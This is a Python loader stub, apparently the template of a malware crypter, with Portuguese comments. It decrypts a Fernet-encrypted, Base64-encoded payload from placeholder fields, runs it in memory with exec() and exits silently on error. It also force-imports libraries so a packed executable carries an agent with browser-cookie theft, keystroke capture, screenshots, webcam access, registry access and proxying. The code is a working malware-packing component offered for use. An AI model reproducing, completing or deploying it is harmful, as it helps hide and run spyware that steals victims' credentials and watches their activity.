import base64
from cryptography.fernet import Fernet
import sys
import os
import traceback

# ==================================================================
#                       INÍCIO DA CORREÇÃO DEFINITIVA
# ==================================================================
# --- IMPORTAÇÕES OCULTAS PARA O COMPILADOR ---
# Adicionando todas as dependências do seu agent.py para garantir que o
# PyInstaller/Nuitka as inclua no executável final.

try:
    # --- Bibliotecas de Terceiros Essenciais ---
    import requests
    import numpy
    import cv2
    import pynput
    import psutil
    import browser_cookie3
    from Cryptodome.Cipher import AES
    from Cryptodome.Random import get_random_bytes
    from PIL import ImageGrab

    # --- Biblioteca Padrão (Altamente Recomendado) ---
    import sqlite3
    import json
    import winreg
    import shutil
    import time
    import platform
    import socket
    import uuid
    import string
    import subprocess
    import random
    import importlib
    import socks
    import ctypes
    import threading
    import ipaddress
    from datetime import datetime
    from http.server import HTTPServer, BaseHTTPRequestHandler
    from socketserver import ThreadingMixIn

   
    import os 

except ImportError:
    pass

ENCRYPTED_PAYLOAD = "%%ENCRYPTED_PAYLOAD%%"
DECRYPTION_KEY = "%%DECRYPTION_KEY%%"

def run_in_memory(payload_code):
    """Executa o código do payload no contexto do módulo atual."""
    exec(payload_code, globals())

def main():
    try:
        key = base64.b64decode(DECRYPTION_KEY)
        encrypted_data = base64.b64decode(ENCRYPTED_PAYLOAD)
        cipher = Fernet(key)
        decrypted_payload = cipher.decrypt(encrypted_data)
        run_in_memory(decrypted_payload.decode('utf-8'))
    except Exception:
        # Falha silenciosamente em produção.
        sys.exit(0)

if __name__ == "__main__":
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        pass
    main()
